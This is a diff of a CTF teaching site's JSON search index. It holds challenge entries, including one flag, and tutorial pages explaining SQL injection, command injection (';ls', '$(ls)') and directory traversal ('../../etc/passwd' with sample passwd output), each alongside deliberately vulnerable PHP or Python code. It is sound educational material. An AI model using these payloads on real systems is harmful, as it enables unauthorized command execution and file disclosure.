+        {
+            "location": "/challenges/2015/pwn/rhinoxorus/#author", 
+            "text": "Edwards", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/rhinoxorus/#points", 
+            "text": "500", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/rhinoxorus/#category", 
+            "text": "Pwn", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/rhinoxorus/#description", 
+            "text": "", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/rhinoxorus/#flag", 
+            "text": "cc21fe41b44ba70d0e6978c840698601", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/rhinoxorus/#solution", 
+            "text": "", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/rhinoxorus/#setup", 
+            "text": "", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/creditforcredits/", 
+            "text": "CreditForCredits\n\n\nAuthor\n\n\nWiens\n\n\nPoints\n\n\n25\n\n\nCategory\n\n\nPwnadventureZ\n\n\nDescription\n\n\nThis challenge can be found in PwnAdventureZ\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://andrewdutcher.com/view/21/pwn-adventure-z---writeup\n\n\n\n\nSetup\n\n\nPwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
+            "title": "Credit for Credits"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/creditforcredits/#creditforcredits", 
+            "text": "", 
+            "title": "CreditForCredits"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/creditforcredits/#author", 
+            "text": "Wiens", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/creditforcredits/#points", 
+            "text": "25", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/creditforcredits/#category", 
+            "text": "PwnadventureZ", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/creditforcredits/#description", 
+            "text": "This challenge can be found in PwnAdventureZ", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/creditforcredits/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/creditforcredits/#solution", 
+            "text": "http://andrewdutcher.com/view/21/pwn-adventure-z---writeup", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/creditforcredits/#setup", 
+            "text": "PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/greetingsearthling/", 
+            "text": "GreetingsEarthling\n\n\nAuthor\n\n\nWiens\n\n\nPoints\n\n\n25\n\n\nCategory\n\n\nPwnAdventureZ\n\n\nDescription:**\n\n\nThis challenge can be found in PwnAdventureZ\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://andrewdutcher.com/view/21/pwn-adventure-z---writeup\n\n\n\n\nSetup\n\n\nPwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
+            "title": "Greetings Earthlings"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/greetingsearthling/#greetingsearthling", 
+            "text": "", 
+            "title": "GreetingsEarthling"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/greetingsearthling/#author", 
+            "text": "Wiens", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/greetingsearthling/#points", 
+            "text": "25", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/greetingsearthling/#category", 
+            "text": "PwnAdventureZ", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/greetingsearthling/#description", 
+            "text": "This challenge can be found in PwnAdventureZ", 
+            "title": "Description:**"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/greetingsearthling/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/greetingsearthling/#solution", 
+            "text": "http://andrewdutcher.com/view/21/pwn-adventure-z---writeup", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/greetingsearthling/#setup", 
+            "text": "PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/hiddencave/", 
+            "text": "HiddenCave\n\n\nAuthor\n\n\nWiens\n\n\nCategory\n\n\nPwnAdventureZ\n\n\nPoints\n\n\n150\n\n\nDescription\n\n\nThis challenge can be found in PwnAdventureZ\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://andrewdutcher.com/view/21/pwn-adventure-z---writeup\n\n\n\n\nSetup\n\n\nPwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
+            "title": "Hidden Cave"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/hiddencave/#hiddencave", 
+            "text": "", 
+            "title": "HiddenCave"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/hiddencave/#author", 
+            "text": "Wiens", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/hiddencave/#category", 
+            "text": "PwnAdventureZ", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/hiddencave/#points", 
+            "text": "150", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/hiddencave/#description", 
+            "text": "This challenge can be found in PwnAdventureZ", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/hiddencave/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/hiddencave/#solution", 
+            "text": "http://andrewdutcher.com/view/21/pwn-adventure-z---writeup", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/hiddencave/#setup", 
+            "text": "PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/quarantinebreaker/", 
+            "text": "QuarantineBreaker\n\n\nAuthor\n\n\nWiens\n\n\nPoints\n\n\n250\n\n\nCategory\n\n\nPwnAdventureZ\n\n\nDescription\n\n\nThis challenge can be found in PwnAdventureZ\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://andrewdutcher.com/view/21/pwn-adventure-z---writeup\n\n\n\n\nSetup\n\n\nPwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
+            "title": "Quarentine Breaker"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/quarantinebreaker/#quarantinebreaker", 
+            "text": "", 
+            "title": "QuarantineBreaker"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/quarantinebreaker/#author", 
+            "text": "Wiens", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/quarantinebreaker/#points", 
+            "text": "250", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/quarantinebreaker/#category", 
+            "text": "PwnAdventureZ", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/quarantinebreaker/#description", 
+            "text": "This challenge can be found in PwnAdventureZ", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/quarantinebreaker/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/quarantinebreaker/#solution", 
+            "text": "http://andrewdutcher.com/view/21/pwn-adventure-z---writeup", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/quarantinebreaker/#setup", 
+            "text": "PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/blox/", 
+            "text": "blox\n\n\nAuthor\n\n\nWiens\n\n\nCategory\n\n\nPwnadventurez\n\n\nPoints\n\n\n250\n\n\nDescription\n\n\nThis challenge can be found in PwnAdventureZ\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://andrewdutcher.com/view/21/pwn-adventure-z---writeup\n\n\n\n\nSetup\n\n\nPwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
+            "title": "Blox"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/blox/#blox", 
+            "text": "", 
+            "title": "blox"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/blox/#author", 
+            "text": "Wiens", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/blox/#category", 
+            "text": "Pwnadventurez", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/blox/#points", 
+            "text": "250", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/blox/#description", 
+            "text": "This challenge can be found in PwnAdventureZ", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/blox/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/blox/#solution", 
+            "text": "http://andrewdutcher.com/view/21/pwn-adventure-z---writeup", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/blox/#setup", 
+            "text": "PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/get-flag/", 
+            "text": "get_flag\n\n\nAuthor\n\n\nWiens\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nPwnadventurez\n\n\nDescription\n\n\nThis challenge can be found in PwnAdventureZ\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://andrewdutcher.com/view/21/pwn-adventure-z---writeup\n\n\n\n\nSetup\n\n\nPwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
+            "title": "Get Flag"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/get-flag/#get_flag", 
+            "text": "", 
+            "title": "get_flag"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/get-flag/#author", 
+            "text": "Wiens", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/get-flag/#points", 
+            "text": "400", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/get-flag/#category", 
+            "text": "Pwnadventurez", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/get-flag/#description", 
+            "text": "This challenge can be found in PwnAdventureZ", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/get-flag/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/get-flag/#solution", 
+            "text": "http://andrewdutcher.com/view/21/pwn-adventure-z---writeup", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/get-flag/#setup", 
+            "text": "PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
+            "title": "Setup"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/memory-disclosure-flag/", 
+            "text": "memory_disclosure_flag\n\n\nAuthor\n\n\nWiens\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nPwnAdventureZ\n\n\nDescription\n\n\nThis flag can be found in PwnAdventureZ\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://andrewdutcher.com/view/21/pwn-adventure-z---writeup\n\n\n\n\nSetup\n\n\nPwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
+            "title": "Memory Disclosure Flag"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/memory-disclosure-flag/#memory_disclosure_flag", 
+            "text": "", 
+            "title": "memory_disclosure_flag"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/memory-disclosure-flag/#author", 
+            "text": "Wiens", 
+            "title": "Author"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/memory-disclosure-flag/#points", 
+            "text": "500", 
+            "title": "Points"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/memory-disclosure-flag/#category", 
+            "text": "PwnAdventureZ", 
+            "title": "Category"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/memory-disclosure-flag/#description", 
+            "text": "This flag can be found in PwnAdventureZ", 
+            "title": "Description"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/memory-disclosure-flag/#flag", 
+            "text": "", 
+            "title": "Flag"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/memory-disclosure-flag/#solution", 
+            "text": "http://andrewdutcher.com/view/21/pwn-adventure-z---writeup", 
+            "title": "Solution"
+        }, 
+        {
+            "location": "/challenges/2015/pwn/memory-disclosure-flag/#setup", 
+            "text": "PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
+            "title": "Setup"
+        }, 
+        {
             "location": "/web-exploitation/introduction/", 
             "text": "Web Exploitation\n\n\nWebsites all around the world are programmed using various programming languages. While there are specific vulnerabilities in each programming langage that the developer should be aware of, there are issues fundamental to the internet that can show up regardless of the chosen language or framework.\n\n\nThese vulnerabilities often show up in CTFs as web security challenges where the user needs to exploit a bug to gain some kind of higher level privelege.\n\n\nCommon vulnerabilities to see in CTF challenges:\n\n\n\n\nSQL Injection\n\n\nDirectory Traversal\n\n\nCommand Injection\n\n\nServer Side Request Forgery\n\n\nCross Site Scripting\n\n\nCross Site Request Forgery", 
             "title": "Introduction"
@@ -1907,32 +2947,32 @@
         }, 
         {
             "location": "/web-exploitation/sql-injection/what-is-sql-injection/", 
-            "text": "SQL Injection\n\n\nSQL Injection is a vulnerability where a developer takes input from a user and doesn't vaildate that the user's input doesn't contain additional SQL.", 
+            "text": "SQL Injection\n\n\nSQL Injection is a vulnerability where an application takes input from a user and doesn't vaildate that the user's input doesn't contain additional SQL.\n\n\n?php\n\n    \n$username\n \n=\n \n$_GET\n[\nusername\n];\n \n// kchung\n\n    \n$result\n \n=\n \nmysql_query\n(\nSELECT * FROM users WHERE username=\n$username\n);\n\n\n?\n\n\n\n\n\n\nIf we look at the $username variable, under normal operation we might expect the username parameter to be a real username (e.g. kchung).\n\n\nBut a malicious user might submit different kind of data. For example, consider if the input was \n'\n?\n\n\nThe application would crash because the resulting SQL query is incorrect.\n\n\nSELECT\n \n*\n \nFROM\n \nusers\n \nWHERE\n \nusername\n=\n\n\n\n\n\n\n\n\nNote\n\n\nNotice the extra single quote at the end.\n\n\n\n\nWith the knowledge that a single quote will cause an error in the application we can expand a little more on SQL Injection.\n\n\nWhat if our input was \n' OR 1=1\n?\n\n\nSELECT\n \n*\n \nFROM\n \nusers\n \nWHERE\n \nusername\n=\n \nOR\n \n1\n=\n1\n\n\n\n\n\n\n1 is indeed equal to 1. This equates to true in SQL. If we reinterpret this the SQL statement is really saying\n\n\nSELECT\n \n*\n \nFROM\n \nusers\n \nWHERE\n \nusername\n=\n \nOR\n \ntrue\n\n\n\n\n\n\nThis will return every row in the table because each row that exists must be true.\n\n\nWe can also inject comments and termination characters like \n--\n or \n/*\n or \n;\n. This allows you to terminate SQL queries after your injected statements. For example \n'--\n is a common SQL injection payload.\n\n\nSELECT\n \n*\n \nFROM\n \nusers\n \nWHERE\n \nusername\n=\n-- \n\n\n\n\n\n\nThis payload sets the username parameter to an empty string to break out of the query and then adds a comment (\n--\n) that effectively hides the second single quote.\n\n\nUsing this technique of adding SQL statements to an existing query we can force databases to return data that it was not meant to return.", 
             "title": "What is SQL Injection"
         }, 
         {
             "location": "/web-exploitation/sql-injection/what-is-sql-injection/#sql-injection", 
-            "text": "SQL Injection is a vulnerability where a developer takes input from a user and doesn't vaildate that the user's input doesn't contain additional SQL.", 
+            "text": "SQL Injection is a vulnerability where an application takes input from a user and doesn't vaildate that the user's input doesn't contain additional SQL.  ?php \n     $username   =   $_GET [ username ];   // kchung \n     $result   =   mysql_query ( SELECT * FROM users WHERE username= $username );  ?   If we look at the $username variable, under normal operation we might expect the username parameter to be a real username (e.g. kchung).  But a malicious user might submit different kind of data. For example, consider if the input was  ' ?  The application would crash because the resulting SQL query is incorrect.  SELECT   *   FROM   users   WHERE   username =    Note  Notice the extra single quote at the end.   With the knowledge that a single quote will cause an error in the application we can expand a little more on SQL Injection.  What if our input was  ' OR 1=1 ?  SELECT   *   FROM   users   WHERE   username =   OR   1 = 1   1 is indeed equal to 1. This equates to true in SQL. If we reinterpret this the SQL statement is really saying  SELECT   *   FROM   users   WHERE   username =   OR   true   This will return every row in the table because each row that exists must be true.  We can also inject comments and termination characters like  --  or  /*  or  ; . This allows you to terminate SQL queries after your injected statements. For example  '--  is a common SQL injection payload.  SELECT   *   FROM   users   WHERE   username = --    This payload sets the username parameter to an empty string to break out of the query and then adds a comment ( -- ) that effectively hides the second single quote.  Using this technique of adding SQL statements to an existing query we can force databases to return data that it was not meant to return.", 
             "title": "SQL Injection"
         }, 
         {
             "location": "/web-exploitation/sql-injection/what-is-sql-injection/", 
-            "text": "SQL Injection\n\n\nSQL Injection is a vulnerability where a developer takes input from a user and doesn't vaildate that the user's input doesn't contain additional SQL.", 
+            "text": "SQL Injection\n\n\nSQL Injection is a vulnerability where an application takes input from a user and doesn't vaildate that the user's input doesn't contain additional SQL.\n\n\n?php\n\n    \n$username\n \n=\n \n$_GET\n[\nusername\n];\n \n// kchung\n\n    \n$result\n \n=\n \nmysql_query\n(\nSELECT * FROM users WHERE username=\n$username\n);\n\n\n?\n\n\n\n\n\n\nIf we look at the $username variable, under normal operation we might expect the username parameter to be a real username (e.g. kchung).\n\n\nBut a malicious user might submit different kind of data. For example, consider if the input was \n'\n?\n\n\nThe application would crash because the resulting SQL query is incorrect.\n\n\nSELECT\n \n*\n \nFROM\n \nusers\n \nWHERE\n \nusername\n=\n\n\n\n\n\n\n\n\nNote\n\n\nNotice the extra single quote at the end.\n\n\n\n\nWith the knowledge that a single quote will cause an error in the application we can expand a little more on SQL Injection.\n\n\nWhat if our input was \n' OR 1=1\n?\n\n\nSELECT\n \n*\n \nFROM\n \nusers\n \nWHERE\n \nusername\n=\n \nOR\n \n1\n=\n1\n\n\n\n\n\n\n1 is indeed equal to 1. This equates to true in SQL. If we reinterpret this the SQL statement is really saying\n\n\nSELECT\n \n*\n \nFROM\n \nusers\n \nWHERE\n \nusername\n=\n \nOR\n \ntrue\n\n\n\n\n\n\nThis will return every row in the table because each row that exists must be true.\n\n\nWe can also inject comments and termination characters like \n--\n or \n/*\n or \n;\n. This allows you to terminate SQL queries after your injected statements. For example \n'--\n is a common SQL injection payload.\n\n\nSELECT\n \n*\n \nFROM\n \nusers\n \nWHERE\n \nusername\n=\n-- \n\n\n\n\n\n\nThis payload sets the username parameter to an empty string to break out of the query and then adds a comment (\n--\n) that effectively hides the second single quote.\n\n\nUsing this technique of adding SQL statements to an existing query we can force databases to return data that it was not meant to return.", 
             "title": "Exploiting SQL Injection"
         }, 
         {
             "location": "/web-exploitation/sql-injection/what-is-sql-injection/#sql-injection", 
-            "text": "SQL Injection is a vulnerability where a developer takes input from a user and doesn't vaildate that the user's input doesn't contain additional SQL.", 
+            "text": "SQL Injection is a vulnerability where an application takes input from a user and doesn't vaildate that the user's input doesn't contain additional SQL.  ?php \n     $username   =   $_GET [ username ];   // kchung \n     $result   =   mysql_query ( SELECT * FROM users WHERE username= $username );  ?   If we look at the $username variable, under normal operation we might expect the username parameter to be a real username (e.g. kchung).  But a malicious user might submit different kind of data. For example, consider if the input was  ' ?  The application would crash because the resulting SQL query is incorrect.  SELECT   *   FROM   users   WHERE   username =    Note  Notice the extra single quote at the end.   With the knowledge that a single quote will cause an error in the application we can expand a little more on SQL Injection.  What if our input was  ' OR 1=1 ?  SELECT   *   FROM   users   WHERE   username =   OR   1 = 1   1 is indeed equal to 1. This equates to true in SQL. If we reinterpret this the SQL statement is really saying  SELECT   *   FROM   users   WHERE   username =   OR   true   This will return every row in the table because each row that exists must be true.  We can also inject comments and termination characters like  --  or  /*  or  ; . This allows you to terminate SQL queries after your injected statements. For example  '--  is a common SQL injection payload.  SELECT   *   FROM   users   WHERE   username = --    This payload sets the username parameter to an empty string to break out of the query and then adds a comment ( -- ) that effectively hides the second single quote.  Using this technique of adding SQL statements to an existing query we can force databases to return data that it was not meant to return.", 
             "title": "SQL Injection"
         }, 
         {
             "location": "/web-exploitation/command-injection/what-is-command-injection/", 
-            "text": "Command Injection\n\n\nCommand Injection is a vulnerability that allows an attacker to submit system commands to a website. This happens when the application fails to encode user input that goes into a system shell. It is very common to see this vulnerability when a developer uses the \nsystem()\n command or the equivalent way to run a system/shell command in a given programming language.\n\n\nimport\n \nos\n\n\n\ndomain\n \n=\n \nuser_input\n()\n \n# ctf101.org\n\n\n\nos\n.\nsystem\n(\nping \n \n+\n \ndomain\n)\n\n\n\n\n\n\nThe above code when used normally will ping the \nctf101.org\n domain.\n\n\nBut consider what would happen if the \nuser_input()\n function returned different data?\n\n\nimport\n \nos\n\n\n\ndomain\n \n=\n \nuser_input\n()\n \n# ; ls\n\n\n\nos\n.\nsystem\n(\nping \n \n+\n \ndomain\n)\n\n\n\n\n\n\nUnder this input, the code will do two things.\n\n\n\n\nRun the \nping\n command (with no input)\n\n\nRun the \nls\n command\n\n\n\n\nBecause of the additional semicolon, the \nos.system()\n function is instructed to run two commands.\n\n\nThis is the core concept behind command injection. The \nls\n command could of course be switched with another command (e.g. wget, curl, bash, etc.)\n\n\nCommand injection is a very common means of privelege escalation within web applications and applications that interface with system commands.\n\n\nExample Payloads\n\n\n\n\n;ls\n\n\n$(ls)\n\n\n`ls`\n\n\n\n\nRelated Challenges", 
+            "text": "Command Injection\n\n\nCommand Injection is a vulnerability that allows an attacker to submit system commands to a computer running a website. This happens when the application fails to encode user input that goes into a system shell. It is very common to see this vulnerability when a developer uses the \nsystem()\n command or its equivalent in the programming language of the application.\n\n\nimport\n \nos\n\n\n\ndomain\n \n=\n \nuser_input\n()\n \n# ctf101.org\n\n\n\nos\n.\nsystem\n(\nping \n \n+\n \ndomain\n)\n\n\n\n\n\n\nThe above code when used normally will ping the \nctf101.org\n domain.\n\n\nBut consider what would happen if the \nuser_input()\n function returned different data?\n\n\nimport\n \nos\n\n\n\ndomain\n \n=\n \nuser_input\n()\n \n# ; ls\n\n\n\nos\n.\nsystem\n(\nping \n \n+\n \ndomain\n)\n\n\n\n\n\n\nBecause of the additional semicolon, the \nos.system()\n function is instructed to run two commands.\n\n\nIt looks to the program as:\n\n\nping ; ls\n\n\n\n\n\n\n\nNote\n\n\nThe semicolon terminates a command in bash and allows you to put another command after it.\n\n\n\n\nBecause the \nping\n command is being terminated and the \nls\n command is being added on, the \nls\n command will be run in addition to the empty ping command!\n\n\nThis is the core concept behind command injection. The \nls\n command could of course be switched with another command (e.g. wget, curl, bash, etc.)\n\n\nCommand injection is a very common means of privelege escalation within web applications and applications that interface with system commands. Many kinds of home routers take user input and directly append it to a system command. For this reason, many of those home router models are vulnerable to command injection.\n\n\nExample Payloads\n\n\n\n\n;ls\n\n\n$(ls)\n\n\n`ls`\n\n\n\n\nRelated Challenges", 
             "title": "What is Command Injection"
         }, 
         {
             "location": "/web-exploitation/command-injection/what-is-command-injection/#command-injection", 
-            "text": "Command Injection is a vulnerability that allows an attacker to submit system commands to a website. This happens when the application fails to encode user input that goes into a system shell. It is very common to see this vulnerability when a developer uses the  system()  command or the equivalent way to run a system/shell command in a given programming language.  import   os  domain   =   user_input ()   # ctf101.org  os . system ( ping    +   domain )   The above code when used normally will ping the  ctf101.org  domain.  But consider what would happen if the  user_input()  function returned different data?  import   os  domain   =   user_input ()   # ; ls  os . system ( ping    +   domain )   Under this input, the code will do two things.   Run the  ping  command (with no input)  Run the  ls  command   Because of the additional semicolon, the  os.system()  function is instructed to run two commands.  This is the core concept behind command injection. The  ls  command could of course be switched with another command (e.g. wget, curl, bash, etc.)  Command injection is a very common means of privelege escalation within web applications and applications that interface with system commands.", 
+            "text": "Command Injection is a vulnerability that allows an attacker to submit system commands to a computer running a website. This happens when the application fails to encode user input that goes into a system shell. It is very common to see this vulnerability when a developer uses the  system()  command or its equivalent in the programming language of the application.  import   os  domain   =   user_input ()   # ctf101.org  os . system ( ping    +   domain )   The above code when used normally will ping the  ctf101.org  domain.  But consider what would happen if the  user_input()  function returned different data?  import   os  domain   =   user_input ()   # ; ls  os . system ( ping    +   domain )   Because of the additional semicolon, the  os.system()  function is instructed to run two commands.  It looks to the program as:  ping ; ls   Note  The semicolon terminates a command in bash and allows you to put another command after it.   Because the  ping  command is being terminated and the  ls  command is being added on, the  ls  command will be run in addition to the empty ping command!  This is the core concept behind command injection. The  ls  command could of course be switched with another command (e.g. wget, curl, bash, etc.)  Command injection is a very common means of privelege escalation within web applications and applications that interface with system commands. Many kinds of home routers take user input and directly append it to a system command. For this reason, many of those home router models are vulnerable to command injection.", 
             "title": "Command Injection"
         }, 
         {
@@ -1944,6 +2984,16 @@
             "location": "/web-exploitation/command-injection/what-is-command-injection/#related-challenges", 
             "text": "", 
             "title": "Related Challenges"
+        }, 
+        {
+            "location": "/web-exploitation/directory-traversal/what-is-directory-traversal/", 
+            "text": "Directory Traversal\n\n\nDirectory Traversal is a vulnerability where an application takes in user input and uses it in a directory path.\n\n\nAny kind of path controlled by user input that isn't properly sanitized or properly sandboxed could be vulnerable to directory traversal.\n\n\nFor example, consider an application that allows the user to choose what page to load from a GET parameter.\n\n\n?php\n\n    \n$page\n \n=\n \n$_GET\n[\npage\n];\n \n// index.php\n\n    \ninclude\n(\n/var/www/html/\n \n.\n \n$page\n);\n\n\n?\n\n\n\n\n\n\nUnder normal operation the page would be \nindex.php\n. But what if a malicious user gave in something different?\n\n\n?php\n\n    \n$page\n \n=\n \n$_GET\n[\npage\n];\n \n// ../../../../../../../../etc/passwd\n\n    \ninclude\n(\n/var/www/html/\n \n.\n \n$page\n);\n\n\n?\n\n\n\n\n\n\nHere the user is submitting \n../../../../../../../../etc/passwd\n.\n\n\nThis will result in the PHP interpreter leaving the directory that it is coded to look in ('/var/www/html') and instead be forced up to the root folder.\n\n\ninclude(\n/var/www/html/../../../../../../../../etc/passwd\n);\n\n\n\n\n\n\nUltimately this will become \n/etc/passwd\n because the computer will not go a directory above its top directory.\n\n\nThus the application will load the \n/etc/passwd\n file and emit it to the user like so:\n\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\nsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\nsystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\nsystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\n_apt:x:104:65534::/nonexistent:/bin/false\n\n\n\n\n\nThis same concept can be applied to applications where some input is taken from a user and then used to access a file or path or similar. This vulnerability very often can be used to leak sensitive data or extract application source code to find other vulnerabilities.", 
+            "title": "What is Directory Traversal"
+        }, 
+        {
+            "location": "/web-exploitation/directory-traversal/what-is-directory-traversal/#directory-traversal", 
+            "text": "Directory Traversal is a vulnerability where an application takes in user input and uses it in a directory path.  Any kind of path controlled by user input that isn't properly sanitized or properly sandboxed could be vulnerable to directory traversal.  For example, consider an application that allows the user to choose what page to load from a GET parameter.  ?php \n     $page   =   $_GET [ page ];   // index.php \n     include ( /var/www/html/   .   $page );  ?   Under normal operation the page would be  index.php . But what if a malicious user gave in something different?  ?php \n     $page   =   $_GET [ page ];   // ../../../../../../../../etc/passwd \n     include ( /var/www/html/   .   $page );  ?   Here the user is submitting  ../../../../../../../../etc/passwd .  This will result in the PHP interpreter leaving the directory that it is coded to look in ('/var/www/html') and instead be forced up to the root folder.  include( /var/www/html/../../../../../../../../etc/passwd );   Ultimately this will become  /etc/passwd  because the computer will not go a directory above its top directory.  Thus the application will load the  /etc/passwd  file and emit it to the user like so:  root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List 